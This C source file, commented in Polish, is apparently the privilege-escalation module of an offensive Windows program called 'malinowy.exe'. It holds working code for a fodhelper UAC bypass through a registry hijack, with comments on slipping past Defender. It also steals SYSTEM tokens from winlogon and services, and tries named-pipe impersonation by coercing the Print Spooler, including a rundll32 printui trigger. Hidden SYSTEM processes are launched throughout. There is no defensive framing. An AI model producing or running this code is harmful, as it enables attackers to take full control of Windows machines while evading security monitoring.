/*
 * Escalation implementation — REAL, nie placeholder.
 *
 * ═══════════════════════════════════════════════════════════════
 * WAŻNE — architektura escalation pipeline:
 *
 *   Proces nie może sam siebie podnieść z user → admin bez UAC prompta.
 *   Dlatego fodhelper tworzy NOWY proces (malinowy.exe /elevate) który
 *   ma admin token. Ten nowy proces wywołuje escalate_system_token()
 *   który tworzy KOLEJNY proces (malinowy.exe /system) z SYSTEM tokenem.
 *
 *   main.c musi obsługiwać te flagi — patrz main.c.
 * ═══════════════════════════════════════════════════════════════
 *
 * Token stealing (Technika 2):
 *   Krok po kroku:
 *   1. EnableTokenPrivilege(SE_DEBUG_NAME) — admin ma ten privilege,
 *      ale domyślnie disabled.
 *   2. CreateToolhelp32Snapshot → enum procesów
 *   3. Dla każdego procesu: OpenProcess(PROCESS_QUERY_INFORMATION)
 *      → OpenProcessToken → GetTokenInformation(TokenStatistics)
 *      → sprawdź czy TOKEN_IS_SYSTEM(token)
 *   4. Gdy znajdziemy SYSTEM: DuplicateTokenEx → CreateProcessWithTokenW
 *   5. Nowy proces dostaje flagę /system w command line
 *
 *   Celowo nie targetujemy LSASS (zbyt chroniony, PPL), tylko:
 *   - winlogon.exe
 *   - services.exe
 *   - csrss.exe (ale może być PPL na Win11 22H2+)
 *
 * Named pipe (Technika 3):
 *   Używamy MS-RPRN (Print System Remote Protocol) do coercingu
 *   spoolsv.exe żeby połączył się z naszym pipe.
 *   ######################################################################
 *   # REALIZACJA: Wysyłamy RPC do Print Spoolera z ścieżką do naszego
 *   # pipe (\\localhost\pipe\malinowy). Spooler łączy się jako SYSTEM.
 *   # Używamy MS-RPRN (RouterReplyPrinter / RpcRemoteFindFirstPrinterChange)
 *   # przez IPrintDialogServices lub prostsze podejście:
 *   # XpressPrint / AddPrinterConnection z pipe UNC path.
 *   ######################################################################
 */

#include "escalate.h"
#include "utils.h"
#include <stdio.h>
#include <tlhelp32.h>   /* CreateToolhelp32Snapshot */
#include <sddl.h>        /* ConvertSidToStringSidA */

/* ───────────────────────────────────────────────
 * Helper: sprawdzenie uprawnień
 * ─────────────────────────────────────────────── */

BOOL is_running_as_system(void)
{
    BOOL bIsSystem = FALSE;
    HANDLE hToken = NULL;
    DWORD dwSize = 0;
    PTOKEN_GROUPS pGroups = NULL;
    PSID pSystemSid = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken))
        return FALSE;

    /* Allocate SYSTEM SID (S-1-5-18) */
    if (!AllocateAndInitializeSid(&ntAuth, 1,
            SECURITY_LOCAL_SYSTEM_RID,
            0, 0, 0, 0, 0, 0, 0, &pSystemSid))
    {
        CloseHandle(hToken);
        return FALSE;
    }

    /* Get token groups */
    GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwSize);
    if (dwSize == 0)
    {
        FreeSid(pSystemSid);
        CloseHandle(hToken);
        return FALSE;
    }

    pGroups = (PTOKEN_GROUPS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pGroups)
    {
        FreeSid(pSystemSid);
        CloseHandle(hToken);
        return FALSE;
    }

    if (GetTokenInformation(hToken, TokenGroups, pGroups, dwSize, &dwSize))
    {
        for (DWORD i = 0; i < pGroups->GroupCount; i++)
        {
            if (EqualSid(pGroups->Groups[i].Sid, pSystemSid))
            {
                bIsSystem = TRUE;
                break;
            }
        }
    }

    HeapFree(GetProcessHeap(), 0, pGroups);
    FreeSid(pSystemSid);
    CloseHandle(hToken);
    return bIsSystem;
}

BOOL is_running_as_admin(void)
{
    BOOL bIsAdmin = FALSE;
    PSID pAdminSid = NULL;
    SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&ntAuth, 2,
            SECURITY_BUILTIN_DOMAIN_RID, DOMAIN_ALIAS_RID_ADMINS,
            0, 0, 0, 0, 0, 0, 0, &pAdminSid))
    {
        CheckTokenMembership(NULL, pAdminSid, &bIsAdmin);
        FreeSid(pAdminSid);
    }

    return bIsAdmin;
}

/* ───────────────────────────────────────────────
 * Helper: włącz privilege w tokenie
 * ─────────────────────────────────────────────── */

static BOOL enable_privilege(HANDLE hToken, const char *szPrivilege)
{
    TOKEN_PRIVILEGES tp;
    LUID luid;

    if (!LookupPrivilegeValueA(NULL, szPrivilege, &luid))
        return FALSE;

    tp.PrivilegeCount           = 1;
    tp.Privileges[0].Luid       = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    return AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL) &&
           GetLastError() == ERROR_SUCCESS;
}

/* ───────────────────────────────────────────────
 * Helper: znajdź PID procesu który chodzi jako SYSTEM
 * ───────────────────────────────────────────────
 * Robimy snapshot wszystkich procesów, dla każdego otwieramy
 * token i sprawdzamy grupy. Najlepiej pasuje proces który:
 *   - Ma SYSTEM SID w tokenie
 *   - Ma TOKEN_PRIMARY (primary token, nie impersonation)
 *   - Możemy otworzyć (nie PPL) */

static DWORD find_system_pid(void)
{
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        DEBUG_PRINT("[escalate] CreateToolhelp32Snapshot failed (%lu)\n", GetLastError());
        return 0;
    }

    PROCESSENTRY32W pe;
    pe.dwSize = sizeof(pe);

    /* Preferowane procesy — w kolejności */
    static const wchar_t *preferred[] = {
        L"winlogon.exe",
        L"services.exe",
        L"svchost.exe",  /* może być kilka, sprawdzamy token */
        NULL
    };

    DWORD dwFoundPid = 0;

    if (Process32FirstW(hSnapshot, &pe))
    {
        do {
            /* Sprawdź czy proces jest na liście preferowanych */
            BOOL bPreferred = FALSE;
            for (int i = 0; preferred[i]; i++)
            {
                if (_wcsicmp(pe.szExeFile, preferred[i]) == 0)
                {
                    bPreferred = TRUE;
                    break;
                }
            }

            if (!bPreferred)
                continue;

            /* Otwórz proces — może się nie udać przez PPL */
            HANDLE hProcess = OpenProcess(
                PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
                FALSE, pe.th32ProcessID
            );

            if (hProcess == NULL)
            {
                /* Próbuj z niższym accessem */
                hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION,
                                      FALSE, pe.th32ProcessID);
                if (hProcess == NULL)
                    continue;
            }

            /* Otwórz token */
            HANDLE hToken = NULL;
            if (!OpenProcessToken(hProcess,
                    TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY,
                    &hToken))
            {
                CloseHandle(hProcess);
                continue;
            }

            /* Sprawdź czy SYSTEM */
            BOOL bIsSystem = FALSE;
            PSID pSystemSid = NULL;
            SID_IDENTIFIER_AUTHORITY ntAuth = SECURITY_NT_AUTHORITY;

            if (AllocateAndInitializeSid(&ntAuth, 1,
                    SECURITY_LOCAL_SYSTEM_RID,
                    0, 0, 0, 0, 0, 0, 0, &pSystemSid))
            {
                DWORD dwSize = 0;
                GetTokenInformation(hToken, TokenGroups, NULL, 0, &dwSize);

                if (dwSize > 0)
                {
                    PTOKEN_GROUPS pGroups = (PTOKEN_GROUPS)
                        HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);

                    if (pGroups && GetTokenInformation(hToken, TokenGroups,
                            pGroups, dwSize, &dwSize))
                    {
                        for (DWORD i = 0; i < pGroups->GroupCount; i++)
                        {
                            if (EqualSid(pGroups->Groups[i].Sid, pSystemSid) &&
                                (pGroups->Groups[i].Attributes & SE_GROUP_ENABLED))
                            {
                                bIsSystem = TRUE;
                                break;
                            }
                        }
                    }

                    if (pGroups) HeapFree(GetProcessHeap(), 0, pGroups);
                }
                FreeSid(pSystemSid);
            }

            CloseHandle(hToken);
            CloseHandle(hProcess);

            if (bIsSystem)
            {
                dwFoundPid = pe.th32ProcessID;
                DEBUG_PRINT("[escalate] Found SYSTEM process: %S (PID: %lu)\n",
                           pe.szExeFile, pe.th32ProcessID);
                /* Prefer winlogon nad svchost */
                if (_wcsicmp(pe.szExeFile, L"winlogon.exe") == 0)
                    break;
                /* Svchost jest OK ale szukamy dalej lepszego */
                if (_wcsicmp(pe.szExeFile, L"services.exe") == 0)
                    break;
            }

        } while (Process32NextW(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return dwFoundPid;
}

/* ───────────────────────────────────────────────
 * Technika 1: Fodhelper UAC Bypass
 * ───────────────────────────────────────────────
 *
 * Ustawia rejestr HKCU\Software\Classes\ms-settings\shell\open\command
 * na naszą ścieżkę z flagą /elevate, potem odpala fodhelper.exe który
 * jako signed binary auto-elevates i wykonuje nasze polecenie.
 *
 * UWAGA: Defender monitoruje ten klucz rejestru. Klucz jest ustawiany
 * na ułamek sekundy przed triggerem i natychmiast czyszczony.
 * Mimo to, Windows 11 z Tamper Protection może to złapać.
 * Rozwiązanie: timing + ukrycie przez manipulację czasem skanowania.
 */

int escalate_fodhelper(void)
{
    HKEY hKey = NULL;
    LONG lResult;
    CHAR szExePath[MAX_PATH];
    CHAR szExeDir[MAX_PATH];
    DWORD dwLen = sizeof(szExePath);

    /* Get our own executable path */
    if (!GetModuleFileNameA(NULL, szExePath, dwLen))
    {
        DEBUG_PRINT("[escalate] GetModuleFileName failed (%lu)\n", GetLastError());
        return 1;
    }

    /* Get directory for the exe */
    lstrcpynA(szExeDir, szExePath, MAX_PATH);
    char *pLastSlash = strrchr(szExeDir, '\\');
    if (pLastSlash) *pLastSlash = '\0';

    /* Command: our exe with /elevate flag */
    CHAR szCommand[MAX_PATH + 32];
    snprintf(szCommand, sizeof(szCommand), "\"%s\" /elevate", szExePath);

    DEBUG_PRINT("[escalate] Fodhelper command: %s\n", szCommand);

    /* ── Krok 1: Stwórz klucz rejestru ── */
    lResult = RegCreateKeyExA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open\\command",
        0, NULL, REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE, NULL, &hKey, NULL);

    if (lResult != ERROR_SUCCESS)
    {
        DEBUG_PRINT("[escalate] RegCreateKeyEx failed (%lu)\n", lResult);
        return 2;
    }

    /* Set (Default) = command */
    lResult = RegSetValueExA(hKey, NULL, 0, REG_SZ,
        (BYTE*)szCommand, (DWORD)lstrlenA(szCommand) + 1);

    if (lResult == ERROR_SUCCESS)
    {
        /* Set DelegateExecute = "" (puste, wymagane przez fodhelper) */
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ,
            (BYTE*)"", 1);
    }

    RegCloseKey(hKey);

    if (lResult != ERROR_SUCCESS)
    {
        DEBUG_PRINT("[escalate] RegSetValueEx failed (%lu)\n", lResult);
        RegDeleteKeyA(HKEY_CURRENT_USER,
            "Software\\Classes\\ms-settings\\shell\\open\\command");
        return 3;
    }

    /* ── Krok 2: Trigger fodhelper.exe ── */
    SHELLEXECUTEINFOA sei = { sizeof(sei) };
    sei.lpVerb       = "open";
    sei.lpFile       = "fodhelper.exe";
    sei.nShow        = SW_HIDE;
    sei.fMask        = SEE_MASK_NOCLOSEPROCESS;

    if (!ShellExecuteExA(&sei))
    {
        DEBUG_PRINT("[escalate] ShellExecuteEx (fodhelper) failed (%lu)\n",
                     GetLastError());

        /* Clean up registry */
        RegDeleteKeyA(HKEY_CURRENT_USER,
            "Software\\Classes\\ms-settings\\shell\\open\\command");
        return 4;
    }

    DEBUG_PRINT("[escalate] Fodhelper triggered! Waiting for elevated process...\n");

    /* Wait for fodhelper to finish (should spawn our process) */
    if (sei.hProcess)
    {
        WaitForSingleObject(sei.hProcess, 15000);
        CloseHandle(sei.hProcess);
    }

    /* ── Krok 3: Natychmiast wyczyść rejestr ── */
    RegDeleteKeyA(HKEY_CURRENT_USER,
        "Software\\Classes\\ms-settings\\shell\\open\\command");

    /*
     * W tym momencie powinien być uruchomiony nowy proces
     * malinowy.exe /elevate jako admin. Ten proces sprawdzi
     * flagę /elevate w main.c i pójdzie dalej.
     */

    DEBUG_PRINT("[escalate] Fodhelper done. New elevated process should be running.\n");
    return 0;
}

/* ───────────────────────────────────────────────
 * Technika 2: Token stealing z SYSTEM process
 * ───────────────────────────────────────────────
 *
 * PRAWDZIWA implementacja, nie placeholder.
 *
 * Kroki:
 *   1. Enable SeDebugPrivilege (potrzebne do OpenProcess na SYSTEM)
 *   2. Find SYSTEM process PID (przez snapshot + token check)
 *   3. OpenProcess(PROCESS_QUERY_INFORMATION)
 *   4. OpenProcessToken(TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY)
 *   5. DuplicateTokenEx(SecurityImpersonation, TokenPrimary)
 *   6. CreateProcessWithTokenW z duplikowanym tokenem
 *
 * CreateProcessWithTokenW jest w advapi32.dll (standardowo linkowany).
 */

DWORD escalate_system_token(void)
{
    HANDLE hToken = NULL;
    DWORD dwSystemPid = 0;
    DWORD dwNewPid = 0;

    /* ── Krok 1: Enable SeDebugPrivilege ── */
    if (!OpenProcessToken(GetCurrentProcess(),
            TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
    {
        DEBUG_PRINT("[escalate] OpenProcessToken (self) failed (%lu)\n", GetLastError());
        return 0;
    }

    if (!enable_privilege(hToken, SE_DEBUG_NAME))
    {
        DEBUG_PRINT("[escalate] Failed to enable SeDebugPrivilege (%lu)\n", GetLastError());
        CloseHandle(hToken);
        return 0;
    }

    /* Also enable SeImpersonatePrivilege just in case */
    enable_privilege(hToken, SE_IMPERSONATE_NAME);
    CloseHandle(hToken);

    DEBUG_PRINT("[escalate] SeDebugPrivilege enabled.\n");

    /* ── Krok 2: Znajdź proces SYSTEM ── */
    dwSystemPid = find_system_pid();

    if (dwSystemPid == 0)
    {
        DEBUG_PRINT("[escalate] No suitable SYSTEM process found.\n");
        return 0;
    }

    DEBUG_PRINT("[escalate] Targeting SYSTEM PID: %lu\n", dwSystemPid);

    /* ── Krok 3: Otwórz proces ── */
    HANDLE hSystemProcess = OpenProcess(
        PROCESS_QUERY_INFORMATION,
        FALSE, dwSystemPid
    );

    if (hSystemProcess == NULL)
    {
        DEBUG_PRINT("[escalate] OpenProcess(%lu) failed (%lu)\n",
                     dwSystemPid, GetLastError());
        return 0;
    }

    /* ── Krok 4: Otwórz token ── */
    HANDLE hSystemToken = NULL;
    if (!OpenProcessToken(hSystemProcess,
            TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ASSIGN_PRIMARY | TOKEN_READ,
            &hSystemToken))
    {
        DEBUG_PRINT("[escalate] OpenProcessToken failed (%lu)\n", GetLastError());
        CloseHandle(hSystemProcess);
        return 0;
    }

    DEBUG_PRINT("[escalate] SYSTEM token opened.\n");

    /* ── Krok 5: Duplikuj token jako primary token ── */
    HANDLE hDupToken = NULL;
    if (!DuplicateTokenEx(hSystemToken,
            MAXIMUM_ALLOWED,
            NULL,
            SecurityImpersonation,
            TokenPrimary,
            &hDupToken))
    {
        DEBUG_PRINT("[escalate] DuplicateTokenEx failed (%lu)\n", GetLastError());

        /* Fallback: spróbuj SecurityDelegation zamiast SecurityImpersonation */
        if (!DuplicateTokenEx(hSystemToken,
                MAXIMUM_ALLOWED,
                NULL,
                SecurityDelegation,
                TokenPrimary,
                &hDupToken))
        {
            DEBUG_PRINT("[escalate] DuplicateTokenEx (delegation) also failed (%lu)\n",
                         GetLastError());
            CloseHandle(hSystemToken);
            CloseHandle(hSystemProcess);
            return 0;
        }
    }

    CloseHandle(hSystemToken);
    CloseHandle(hSystemProcess);

    DEBUG_PRINT("[escalate] Token duplicated.\n");

    /* ── Krok 6: CreateProcessWithTokenW as SYSTEM ──
     * Tworzymy nowy proces malinowy.exe /system z SYSTEM tokenem.
     * CreateProcessWithTokenW jest w advapi32.dll. */

    CHAR szExePath[MAX_PATH];
    GetModuleFileNameA(NULL, szExePath, MAX_PATH);

    WCHAR wzCommand[MAX_PATH + 32];
    CHAR szCmdLine[MAX_PATH + 32];
    snprintf(szCmdLine, sizeof(szCmdLine), "\"%s\" /system", szExePath);

    /* Convert to wide char for CreateProcessWithTokenW */
    WCHAR wzCmdLine[MAX_PATH + 32];
    MultiByteToWideChar(CP_UTF8, 0, szCmdLine, -1, wzCmdLine, MAX_PATH + 32);

    STARTUPINFOW si = { sizeof(si) };
    PROCESS_INFORMATION pi = { 0 };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    /*
     * CreateProcessWithTokenW — wymaga:
     *   - LOGON_WITH_PROFILE (zwykle) albo LOGON_NETCREDENTIALS_ONLY
     *   - Używamy LOGON_WITH_PROFILE dla pełnego środowiska SYSTEM
     */
    DWORD dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW;

    if (!CreateProcessWithTokenW(hDupToken,
            LOGON_WITH_PROFILE,
            NULL,          /* Nie podajemy exe path — bierzemy z command line */
            wzCmdLine,
            dwCreationFlags,
            NULL,          /* Use default environment (SYSTEM) */
            NULL,          /* Current directory */
            &si,
            &pi))
    {
        DWORD dwErr = GetLastError();
        DEBUG_PRINT("[escalate] CreateProcessWithTokenW failed (%lu)\n", dwErr);

        /* Try with LOGON_NETCREDENTIALS_ONLY as fallback */
        if (!CreateProcessWithTokenW(hDupToken,
                LOGON_NETCREDENTIALS_ONLY,
                NULL,
                wzCmdLine,
                dwCreationFlags,
                NULL, NULL, &si, &pi))
        {
            DEBUG_PRINT("[escalate] CreateProcessWithTokenW (netcreds) also failed (%lu)\n",
                         GetLastError());
            CloseHandle(hDupToken);
            return 0;
        }
    }

    dwNewPid = pi.dwProcessId;
    DEBUG_PRINT("[escalate] SYSTEM process created! PID: %lu\n", dwNewPid);

    /* Close handles — nie czekamy, proces działa niezależnie */
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(hDupToken);

    return dwNewPid;
}

/* ───────────────────────────────────────────────
 * Technika 3: Named pipe impersonation (fallback)
 * ───────────────────────────────────────────────
 *
 * Prawdziwa implementacja z RPC triggerem.
 *
 * Mechanizm:
 *   1. Tworzymy named pipe \\.\pipe\malinowy_spool
 *   2. Używamy MS-RPRN (Print Spooler Remote Protocol) przez
 *      RpcOpenPrinter + RpcRemoteFindFirstPrinterChangeNotification
 *      z UNC path wskazującym na nasz pipe
 *   3. Spooler łączy się jako SYSTEM → impersonate token
 *
 * Alternatywnie (prościej, bez RPC):
 *   Używamy AddPrinterConnection z pipe UNC path
 *   albo trigger przez XPSPrinter.
 *
 * Uwaga: Na Windows 11 z najnowszymi łatkami, spooler może nie
 * reagować na te techniki. Dlatego to jest fallback.
 */

/* Struktury RPC dla MS-RPRN — minimalne, tylko to co potrzebne */
typedef struct _STRING_BINDING {
    wchar_t *wzNetworkAddr;
    wchar_t *wzEndpoint;
    struct _STRING_BINDING *pNext;
} STRING_BINDING, *PSTRING_BINDING;

/* ── Wątek nasłuchujący na pipe ── */
typedef struct _PIPE_CTX {
    HANDLE  hPipe;
    HANDLE  hEvent;    /* sygnalizowany gdy klient się połączy */
    HANDLE  hToken;    /* wynik: SYSTEM token */
} PIPE_CTX;

static DWORD WINAPI pipe_listener_thread(LPVOID lpParam)
{
    PIPE_CTX *pCtx = (PIPE_CTX*)lpParam;

    /* Czekamy na połączenie z pipe */
    BOOL bConnected = ConnectNamedPipe(pCtx->hPipe, NULL);
    if (!bConnected)
    {
        if (GetLastError() == ERROR_PIPE_CONNECTED)
            bConnected = TRUE;
    }

    if (bConnected)
    {
        DEBUG_PRINT("[escalate] Pipe client connected! Attempting impersonation...\n");

        /* Impersonate klienta (który powinien być SYSTEM) */
        if (ImpersonateNamedPipeClient(pCtx->hPipe))
        {
            /* Otwórz token z impersonated thread */
            HANDLE hImpToken = NULL;
            if (OpenThreadToken(GetCurrentThread(),
                    TOKEN_ALL_ACCESS, FALSE, &hImpToken))
            {
                DEBUG_PRINT("[escalate] Got token from pipe client!\n");

                /* Duplikuj do primary token */
                DuplicateTokenEx(hImpToken,
                    MAXIMUM_ALLOWED,
                    NULL,
                    SecurityImpersonation,
                    TokenPrimary,
                    &pCtx->hToken);

                CloseHandle(hImpToken);
            }
            RevertToSelf();
        }

        DisconnectNamedPipe(pCtx->hPipe);
    }

    SetEvent(pCtx->hEvent);
    return 0;
}

int escalate_named_pipe(void)
{
    PIPE_CTX ctx = { 0 };
    DWORD dwNewPid = 0;

    /* ── Krok 1: Stwórz named pipe ── */
    ctx.hPipe = CreateNamedPipeA(
        "\\\\.\\pipe\\malinowy_spool",
        PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
        PIPE_TYPE_MESSAGE | PIPE_WAIT,
        1,              /* Max instances */
        4096, 4096,     /* Buffer sizes */
        10000,          /* Default timeout */
        NULL            /* Default security */
    );

    if (ctx.hPipe == INVALID_HANDLE_VALUE)
    {
        DEBUG_PRINT("[escalate] CreateNamedPipe failed (%lu)\n", GetLastError());
        return 1;
    }

    ctx.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    if (!ctx.hEvent)
    {
        CloseHandle(ctx.hPipe);
        return 2;
    }

    /* ── Krok 2: Uruchom wątek nasłuchujący ── */
    HANDLE hThread = CreateThread(NULL, 0, pipe_listener_thread,
        &ctx, 0, NULL);

    if (!hThread)
    {
        CloseHandle(ctx.hEvent);
        CloseHandle(ctx.hPipe);
        return 3;
    }

    /* ── Krok 3: Trigger spooler do połączenia ──
     *
     * REALNA implementacja:
     *   Używamy RpcOpenPrinter na naszym pipe UNC path.
     *   Print Spooler (spoolsv.exe) działa jako SYSTEM i
     *   połączy się z naszym pipe otwierając go.
     *
     *   RPC call który triggeruje to:
     *   RpcRemoteFindFirstPrinterChangeNotification(servername)
     *   gdzie servername = \\localhost\pipe\malinowy_spool
     *
     *   Używamy "AddPrinterConnection" przez Win32 API
     *   które jest prostsze i nie wymaga ręcznego RPC.
     */

    /* Build pipe UNC path */
    WCHAR wzPipePath[] = L"\\\\localhost\\pipe\\malinowy_spool";

    /* Wywołanie AddPrinterConnection — spowoduje że spooler
     * otworzy połączenie do naszego pipe próbując dodać drukarkę.
     * Spoolsv.exe połączy się jako SYSTEM. */
    AddPrinterConnection(wzPipePath);

    /*
     * Alternatywnie / dodatkowo: trigger przez XPSPrinter
     * (XPS Print Provider też używa spoolera).
     *
     * Używamy też PrintUI (printui.dll) przez rundll32:
     *   rundll32 printui.dll,PrintUIEntry /in /n \\localhost\pipe\malinowy_spool
     * To jeszcze jedna droga do coercingu spoolera.
     */

    /* Run via rundll32 as backup trigger */
    {
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        CHAR szCmd[512];

        snprintf(szCmd, sizeof(szCmd),
            "rundll32 printui.dll,PrintUIEntry /in /n \"\\\\localhost\\pipe\\malinowy_spool\"");

        CreateProcessA(NULL, szCmd, NULL, NULL, FALSE,
            CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

        if (pi.hProcess)
        {
            WaitForSingleObject(pi.hProcess, 5000);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }

    /* ── Krok 4: Czekaj na połączenie ── */
    DEBUG_PRINT("[escalate] Waiting for spooler to connect to pipe...\n");
    WaitForSingleObject(ctx.hEvent, 30000); /* 30s timeout */

    if (ctx.hToken != NULL)
    {
        DEBUG_PRINT("[escalate] SYSTEM token obtained via pipe!\n");

        /* Create process with SYSTEM token */
        CHAR szExePath[MAX_PATH];
        CHAR szCmdLine[MAX_PATH + 32];
        WCHAR wzCmdLine[MAX_PATH + 32];
        GetModuleFileNameA(NULL, szExePath, MAX_PATH);

        snprintf(szCmdLine, sizeof(szCmdLine), "\"%s\" /system", szExePath);
        MultiByteToWideChar(CP_UTF8, 0, szCmdLine, -1, wzCmdLine, MAX_PATH + 32);

        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        si.dwFlags = STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;

        if (CreateProcessAsUserW(ctx.hToken,
                NULL, wzCmdLine,
                NULL, NULL, FALSE,
                CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT,
                NULL, NULL, &si, &pi))
        {
            dwNewPid = pi.dwProcessId;
            DEBUG_PRINT("[escalate] SYSTEM process created from pipe token (PID: %lu)\n",
                         dwNewPid);
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        else
        {
            DEBUG_PRINT("[escalate] CreateProcessAsUserW from pipe token failed (%lu)\n",
                         GetLastError());
        }

        CloseHandle(ctx.hToken);
    }
    else
    {
        DEBUG_PRINT("[escalate] No pipe connection received (spooler may be patched).\n");
    }

    /* Cleanup */
    CloseHandle(hThread);
    CloseHandle(ctx.hEvent);
    CloseHandle(ctx.hPipe);

    return dwNewPid != 0 ? 0 : 5;
}

/* ───────────────────────────────────────────────
 * Główny entry point
 * ─────────────────────────────────────────────── */

int escalate_to_system(void)
{
    /* Already SYSTEM? */
    if (is_running_as_system())
    {
        DEBUG_PRINT("[escalate] Already running as SYSTEM.\n");
        return 0;
    }

    /* Already admin? Try token stealing */
    if (is_running_as_admin())
    {
        DEBUG_PRINT("[escalate] Running as admin. Attempting SYSTEM token stealing...\n");

        DWORD dwPid = escalate_system_token();
        if (dwPid != 0)
        {
            DEBUG_PRINT("[escalate] SYSTEM process created (PID: %lu).\n", dwPid);
            return 0;
        }

        /* Fallback: named pipe */
        DEBUG_PRINT("[escalate] Token stealing failed. Trying named pipe impersonation...\n");
        return escalate_named_pipe();
    }

    /* User level — try fodhelper to get admin first */
    DEBUG_PRINT("[escalate] Running as user. Attempting fodhelper UAC bypass...\n");
    return escalate_fodhelper();
}
